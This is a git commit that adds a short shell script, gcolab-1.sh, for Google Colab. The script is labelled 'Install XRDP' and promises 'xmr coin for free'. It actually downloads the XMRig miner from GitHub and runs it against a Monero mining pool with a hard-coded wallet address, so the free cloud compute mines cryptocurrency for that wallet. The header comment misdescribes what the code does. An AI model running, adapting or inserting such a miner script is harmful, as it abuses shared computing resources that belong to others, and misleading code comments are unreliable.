4b6e4ca952003685b67abf5eee4e8774a6ab23b0
SHAWON553 <104970948+SHAWON553@users.noreply.github.com>
2022-08-24 13:20:27 +0600

    Create gcolab-1.sh

---
+++ gcolab-1.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P -k --tls -p sam
